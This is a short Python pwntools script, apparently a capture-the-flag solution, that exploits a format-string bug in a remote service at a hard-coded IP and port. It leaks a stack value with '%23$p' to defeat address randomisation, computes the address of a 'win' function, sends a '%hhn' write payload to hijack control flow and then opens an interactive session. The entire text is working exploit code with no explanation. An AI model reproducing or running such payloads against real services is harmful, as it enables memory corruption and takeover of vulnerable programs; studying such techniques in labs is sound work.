from pwn import *

#p = process("./fmt")
#gdb.attach(p)
p = remote("128.199.247.205", 1332)
mainoff = 0x133f
leak = b"%23$p"
p.sendlineafter(b"Give me secret number: ", leak)
mainaddr = p.recvline()
mainaddr = int(mainaddr, 16)

leak = mainaddr - mainoff
win = leak + 0x401C
print(hex(win))
x = b"%171c%8$hhnaaaaa"+p64(win)
print(x)

p.sendlineafter(b"(yes/no)", x)
p.interactive()

